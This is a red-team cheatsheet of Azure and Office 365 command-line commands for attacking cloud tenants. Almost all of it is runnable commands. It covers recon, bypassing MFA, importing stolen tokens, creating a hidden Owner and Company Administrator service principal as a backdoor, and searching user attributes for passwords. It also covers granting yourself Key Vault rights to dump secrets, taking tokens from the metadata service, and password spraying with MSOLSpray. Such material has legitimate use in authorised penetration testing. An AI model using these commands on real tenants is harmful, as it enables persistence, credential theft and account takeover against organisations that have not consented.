## Microsoft Azure & O365 CLI Tool Cheatsheet
By Beau Bullock (@dafthack)

### Recon

Get Federation info for target domain

```
https://login.microsoftonline.com/getuserrealm.srf?login=username@targetdomain.com&xml=1
```


Get Tenant ID for a target domain
```
https://login.microsoftonline.com/<target domain>/v2.0/.well-known/openid-configuration
```

### Az PowerShell Module

```powershell
Import-Module Az
```

#### Authentication

```powershell
Connect-AzAccount

## Or this way sometimes gets around MFA restrictions

$credential = Get-Credential
Connect-AzAccount -Credential $credential
```

Import a context file

```powershell
Import-AzContext -Profile 'C:\Temp\Live Tokens\StolenToken.json'
```

Export a context file

```powershell
Save-AzContext -Path C:\Temp\AzureAccessToken.json
```

#### Account Information

List the current Azure contexts available

```powershell
Get-AzContext -ListAvailable
```

Get context details

```powershell
$context = Get-AzContext
$context.Name
$context.Account
```

List subscriptions

```powershell
Get-AzSubscription
```

Choose a subscription

```powershell
Select-AzSubscription -SubscriptionID "SubscriptionID"
```

Get the current user's role assignment

```powershell
Get-AzRoleAssignment
```

List all resources and resource groups

```powershell
Get-AzResource
Get-AzResourceGroup
```

List storage accounts

```powershell
Get-AzStorageAccount
```

#### WebApps & SQL

List Azure web applications

```powershell
Get-AzAdApplication
Get-AzWebApp
```

List SQL servers

```powershell
Get-AzSQLServer
```

Individual databases can be listed with information retrieved from the previous command

```powershell
Get-AzSqlDatabase -ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

List SQL Firewall rules

```powershell
Get-AzSqlServerFirewallRule –ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

List SQL Server AD Admins

```powershell
Get-AzSqlServerActiveDirectoryAdminstrator -ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

#### Runbooks

List Azure Runbooks

```powershell
Get-AzAutomationAccount
Get-AzAutomationRunbook -AutomationAccountName <AutomationAccountName> -ResourceGroupName <ResourceGroupName>
```

Export a runbook with:

```powershell
Export-AzAutomationRunbook -AutomationAccountName $AccountName -ResourceGroupName $ResourceGroupName -Name $RunbookName -OutputFolder .\Desktop\
```

#### Virtual Machines

List VMs and get OS details

```powershell
Get-AzVM
$vm = Get-AzVM -Name "VM Name" 
$vm.OSProfile
```

Run commands on VMs

```powershell
Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
```

#### Networking

List virtual networks

```powershell
Get-AzVirtualNetwork
```

List public IP addresses assigned to virtual NICs

```powershell
Get-AzPublicIpAddress
```

Get Azure ExpressRoute (VPN) Info

```powershell
Get-AzExpressRouteCircuit
```

Get Azure VPN Info

```powershell
Get-AzVpnConnection
```

#### Backdoors

Create a new Azure service principal as a backdoor

```powershell
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
$UnsecureSecret
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
#Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt
$cred = Get-Credential
Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
```

### MSOnline PowerShell Module

```powershell
Import-Module MSOnline
```

#### Authentication

```powershell
Connect-MsolService

## Or this way sometimes gets around MFA restrictions

$credential = Get-Credential
Connect-MsolService -Credential $credential
```

#### Account and Directory Information

List Company Information

```powershell
Get-MSolCompanyInformation
```

List all users

```powershell
Get-MSolUser -All
```

List all groups

```powershell
Get-MSolGroup -All
```

List members of a group (Global Admins in this case)

```powershell
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember –GroupObjectId $GUID
```

List all user attributes

```powershell
Get-MSolUser –All | fl
```

List Service Principals

```powershell
Get-MsolServicePrincipal
```

One-liner to search all Azure AD user attributes for passwords

```powershell
$users = Get-MsolUser; foreach($user in $users){$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props){if($user.$prop -like "*password*"){Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)}}} 
```

### Az CLI Tool

#### Authentication

```bash
az login
```

#### Dump Azure Key Vaults

List out any key vault resources the current account can view 

```bash
az keyvault list –query '[].name' --output tsv 
```

With contributor level access you can give yourself the right permissions to obtain secrets. 

```bash
az keyvault set-policy --name <KeyVaultname> --upn <YourContributorUsername> --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list 
```

Get URI for Key Vault 

```bash
az keyvault secret list --vault-name <KeyVaultName> --query '[].id' --output tsv 
```

Get cleartext secret from keyvault 

```bash
az keyvault secret show --id <URI from last command> | ConvertFrom-Json
```

### Metadata Service URL

```bash
http://169.254.169.254/metadata
```

Get access tokens from the metadata service

```bash
GET 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' HTTP/1.1 Metadata: true
```

### Other Azure & O365 Tools

#### MicroBurst

Azure security assessment tool

https://github.com/NetSPI/MicroBurst 

Look for open storage blobs 

```powershell
Invoke-EnumerateAzureBlobs -Base $BaseName 
```

Export SSL/TLS certs 

```powershell
Get-AzPasswords -ExportCerts Y
```

Azure Container Registry dump

```powershell
Get-AzPasswords
Get-AzACR
```

#### PowerZure

Azure security assessment tool

https://github.com/hausec/PowerZure

#### ROADTools

Framework to interact with Azure AD

https://github.com/dirkjanm/ROADtools

#### Stormspotter

Red team tool for graphing Azure and Azure AD objects

https://github.com/Azure/Stormspotter

#### MSOLSpray

Tool to password spray Azure/O365

https://github.com/dafthack

```powershell
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020
```

